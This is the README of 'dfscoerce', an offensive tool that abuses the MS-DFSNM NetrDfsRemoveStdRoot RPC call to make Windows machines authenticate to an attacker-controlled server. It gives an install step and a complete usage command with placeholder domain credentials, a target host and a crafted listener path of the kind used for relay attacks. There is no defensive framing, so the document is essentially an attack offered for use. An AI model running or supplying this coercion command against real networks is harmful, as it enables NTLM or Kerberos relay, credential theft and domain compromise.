# dfscoerce

A Windows authentication coercion tool that leverages the MS-DFSNM protocol's `NetrDfsRemoveStdRoot` RPC call to force target machines to authenticate to an attacker-controlled server.
dfscoerce tool. 

## Install
`pipx install .`. 

## Usage Example
`dfscoerce 'DOMAIN.LOCAL/USER:PASSWORD@COMPUTER.DOMAIN.LOCAL' \\\\COMPUTER1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\\path`
